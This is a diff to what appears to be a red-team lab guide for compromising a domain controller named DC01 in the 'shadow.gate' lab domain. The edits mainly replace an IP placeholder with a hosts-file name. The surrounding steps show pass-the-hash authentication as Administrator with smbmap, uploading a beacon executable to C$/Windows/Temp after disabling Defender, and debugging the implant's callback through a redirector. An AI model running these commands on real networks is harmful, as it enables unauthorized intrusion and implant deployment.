@@ -71,7 +71,9 @@ Add the host entry so domain tooling resolves names:
 echo '<ShadowGate IP>  DC01.shadow.gate shadow.gate DC01' | sudo tee -a /etc/hosts
 ```
 
-Success: nmap returns DC01's services (SMB 445, Kerberos 88, LDAP 389/636, WinRM 5985, RDP 3389, and the AD CS web endpoint among them), and `smb-os-discovery` plus `rdp-ntlm-info` report the computer name, domain, and OS build (`DC01` / `shadow.gate`, Server 2022 `10.0.20348`). That confirms the tunnel is carrying operator traffic and gives you the name for the hosts entry you add next.
+From here the guide addresses the DC as `dc01`. If a later `dc01` command fails to resolve (wmiexec or smbmap), re-check this `/etc/hosts` entry first.
+
+Success: nmap returns DC01's services (SMB 445, Kerberos 88, LDAP 389/636, WinRM 5985, RDP 3389, and the AD CS web endpoint among them), and `smb-os-discovery` plus `rdp-ntlm-info` report the computer name, domain, and OS build (`DC01` / `shadow.gate`, Server 2022 `10.0.20348`). That confirms the tunnel is carrying operator traffic and gives you the name used in the hosts entry above.
 
 If it fails: nmap timing out means the tunnel is down. Recheck DEPLOY Step 10 (reachability to the target) and that `<ShadowGate IP>` falls inside your `vpn_tunnel_cidrs`.
 
@@ -127,7 +129,7 @@ class __PARAMETERS
 3. Upload the beacon with smbmap (nxc can time out on the 35 MB binary):
 
 ```bash
-smbmap -H <ShadowGate IP> -d shadow.gate -u Administrator -p 'aad3b435b51404eeaad3b435b51404ee:4366ec0f86e29be2a4a5e87a1ba922ec' --upload ./sysProxy.exe 'C$/Windows/Temp/sysProxy.exe'
+smbmap -H dc01 -d shadow.gate -u Administrator -p 'aad3b435b51404eeaad3b435b51404ee:4366ec0f86e29be2a4a5e87a1ba922ec' --upload ./sysProxy.exe 'C$/Windows/Temp/sysProxy.exe'
 ```
 
 Success:
@@ -174,7 +176,7 @@ ps
 
 Success: a new session from `<ShadowGate IP>` registers and `whoami` returns `SHADOW\Administrator`. This is the beacon, separate from the Windows heartbeat.
 
-If it fails: watch the redirector for the callback (`sudo tail -f /var/log/apache2/redirector-ssl-access.log`, look for `/cloud/storage/objects/`). No hits means the implant is not executing or cannot reach the public EIP. A decoy 200 means a header or prefix mismatch. Confirm Defender was disabled (step 2 runs before step 3) and verify the upload landed with `smbmap -H <ShadowGate IP> -d shadow.gate -u Administrator -p 'aad3b435b51404eeaad3b435b51404ee:4366ec0f86e29be2a4a5e87a1ba922ec' -r 'C$/Windows/Temp'`.
+If it fails: watch the redirector for the callback (`sudo tail -f /var/log/apache2/redirector-ssl-access.log`, look for `/cloud/storage/objects/`). No hits means the implant is not executing or cannot reach the public EIP. A decoy 200 means a header or prefix mismatch. Confirm Defender was disabled (step 2 runs before step 3) and verify the upload landed with `smbmap -H dc01 -d shadow.gate -u Administrator -p 'aad3b435b51404eeaad3b435b51404ee:4366ec0f86e29be2a4a5e87a1ba922ec' -r 'C$/Windows/Temp'`.
 
 ---
 
